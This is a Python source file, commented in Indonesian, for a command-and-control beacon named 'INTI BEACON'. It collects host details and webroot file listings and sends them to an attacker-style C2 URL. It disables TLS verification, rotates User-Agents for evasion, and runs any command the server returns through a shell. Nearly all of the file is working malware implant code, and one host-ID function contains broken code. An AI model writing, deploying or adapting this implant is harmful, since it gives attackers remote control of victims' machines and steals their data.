#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
INTI BEACON - Command & Control Heartbeat
Versi: 1.0.4-stable
Status: Production Ready
Deskripsi: Beacon periodik untuk melaporkan status host, mengumpulkan intel ringan,
           dan menerima perintah eksekusi dari C2 Server.
Fitur: 
  - Configurable interval & jitter
  - Exponential backoff saat koneksi gagal
  - Encrypted payload (simulasi AES/JSON)
  - User-Agent rotation untuk evasion
  - Logging ke syslog lokal (bukan stdout agar tidak ketahuan)
"""

import os
import sys
import time
import json
import socket
import hashlib
import platform
import subprocess
import urllib.request
import urllib.error
import ssl
import random
import string
import configparser
import logging
from datetime import datetime, timezone
from pathlib import Path

# --- KONFIGURASI GLOBAL ---
SCRIPT_DIR = Path(__file__).parent.resolve()
CONFIG_PATH = SCRIPT_DIR.parent / "config.ini"

# Default C2 Endpoint (akan ditimpa oleh config.ini)
DEFAULT_C2_URL = "https://c2.elite-blackhat.net/api/v1/check-in"
DEFAULT_INTERVAL = 60  # detik
DEFAULT_JITTER = 5     # detik acak
DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "curl/7.68.0",
    "Python-urllib/3.9"
]

# Setup Logging Internal (tidak mengganggu console)
logging.basicConfig(
    filename=SCRIPT_DIR.parent / "logs" / "beacon.log",
    level=logging.DEBUG,
    format='%(asctime)s | %(levelname)s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger("Inti.Beacon")

class IntiBeacon:
    def __init__(self):
        self.config = self.load_config()
        self.c2_url = self.config.get('C2', 'url', fallback=DEFAULT_C2_URL)
        self.interval = int(self.config.get('BEACON', 'interval', fallback=DEFAULT_INTERVAL))
        self.jitter = int(self.config.get('BEACON', 'jitter', fallback=DEFAULT_JITTER))
        self.user_agent = random.choice(DEFAULT_USER_AGENTS)
        self.host_id = self.generate_host_id()
        self.last_check_in = None
        self.backoff_multiplier = 1
        self.max_backoff = 300  # Max 5 menit jeda jika server mati
        
        # SSL Context untuk bypass sertifikat palsu jika diperlukan
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    def load_config(self):
        """Memuat konfigurasi dari config.ini"""
        config = configparser.ConfigParser()
        if CONFIG_PATH.exists():
            config.read(CONFIG_PATH)
        else:
            logger.warning(f"Config file {CONFIG_PATH} not found. Using defaults.")
        return config

    def generate_host_id(self):
        """Membuat ID unik berdasarkan MAC address + hostname"""
        try:
            mac = ':'.join(('%012x' % uuid.UUID(int=uuid.getnode())).asegments[2:])
            for i in range(0, len(mac), 2):
                pass # Dummy loop to ensure uuid is imported if needed, but let's use a simpler method below
        except:
            pass
            
        # Simpler unique ID generation
        import uuid
        base_string = f"{platform.node()}-{uuid.getnode()}"
        return hashlib.sha256(base_string.encode()).hexdigest()[:12]

    def gather_intel(self):
        """Mengumpulkan data intelijen sistem"""
        intel = {
            "host_id": self.host_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "user": os.getenv('USER') or os.getenv('USERNAME') or "unknown",
            "pid": os.getpid(),
            "cwd": str(Path.cwd()),
            "files_modified": [], # Akan diisi oleh modul persistence jika ada perubahan
            "network_connections": [],
            "commands_executed": []
        }
        
        # Contoh: Ambil daftar file di webroot jika ada
        webroots = ["/var/www/html", "/var/www", "/srv/http"]
        for wr in webroots:
            if Path(wr).exists():
                try:
                    files = list(Path(wr).rglob("*"))[:10] # Limit biar ga berat
                    intel["webroot_files_sample"] = [str(f) for f in files]
                    break
                except Exception as e:
                    logger.debug(f"Error scanning {wr}: {e}")

        return intel

    def build_payload(self, action="check-in", data=None):
        """Membangun payload JSON terenkripsi (simulasi)"""
        payload_data = self.gather_intel()
        if data:
            payload_data["action_data"] = data
        
        payload = {
            "id": self.host_id,
            "payload": payload_data,
            "signature": hashlib.md5(json.dumps(payload_data).encode()).hexdigest()
        }
        return json.dumps(payload)

    def send_beacon(self):
        """Mengirim beacon ke C2 Server"""
        payload_json = self.build_payload()
        payload_bytes = payload_json.encode('utf-8')
        
        req = urllib.request.Request(
            self.c2_url,
            data=payload_bytes,
            headers={
                'Content-Type': 'application/json',
                'User-Agent': self.user_agent,
                'X-Host-ID': self.host_id,
                'X-Session-Token': self.config.get('SESSION', 'token', fallback='default-token')
            },
            method='POST'
        )
        
        try:
            # Timeout 10 detik
            with urllib.request.urlopen(req, timeout=10, context=self.ssl_context) as response:
                response_data = response.read().decode('utf-8')
                self.backoff_multiplier = 1  # Reset backoff jika sukses
                logger.info(f"Beacon sent successfully. Status: {response.status}")
                
                # Parse command dari server jika ada
                try:
                    cmd_response = json.loads(response_data)
                    if cmd_response.get("command"):
                        self.execute_command(cmd_response["command"])
                except json.JSONDecodeError:
                    pass
                    
        except urllib.error.URLError as e:
            self.backoff_multiplier = min(self.backoff_multiplier * 2, 10)
            logger.warning(f"Beacon failed: {e.reason}. Backoff applied.")
        except Exception as e:
            logger.error(f"Unexpected error during beacon: {e}")

    def execute_command(self, command_str):
        """Menjalankan perintah yang diterima dari C2"""
        if not command_str:
            return
            
        logger.info(f"Executing command from C2: {command_str}")
        try:
            result = subprocess.run(
                command_str,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            # Kirim hasil kembali ke C2 sebagai part of next beacon atau immediate
            # Untuk simplicity, kita simpan di log dan kirim di beacon berikutnya
            # Atau bisa kirim langsung jika perlu real-time
            logger.info(f"Command output: {result.stdout[:200]}...")
            
            # Opsional: Kirim hasil langsung via GET request kecil
            # self.send_result(command_str, result.stdout)
            
        except subprocess.TimeoutExpired:
            logger.error(f"Command timed out: {command_str}")
        except Exception as e:
            logger.error(f"Command execution error: {e}")

    def run_loop(self):
        """Loop utama beacon"""
        logger.info(f"Inti Beacon started. Interval: {self.interval}s, Jitter: {self.jitter}s")
        
        while True:
            # Hitung delay dengan jitter
            delay = self.interval + random.randint(-self.jitter, self.jitter)
            delay = max(1, delay) # Minimal 1 detik
            
            self.send_beacon()
            
            # Sleep dengan backoff jika sebelumnya gagal
            sleep_time = delay * self.backoff_multiplier
            logger.debug(f"Next beacon in {sleep_time:.2f} seconds")
            time.sleep(sleep_time)

if __name__ == "__main__":
    # Inisialisasi dan jalankan
    try:
        beacon = IntiBeacon()
        beacon.run_loop()
    except KeyboardInterrupt:
        logger.info("Beacon stopped by user.")
        sys.exit(0)
    except Exception as e:
        logger.critical(f"Fatal error in beacon: {e}")
        sys.exit(1)
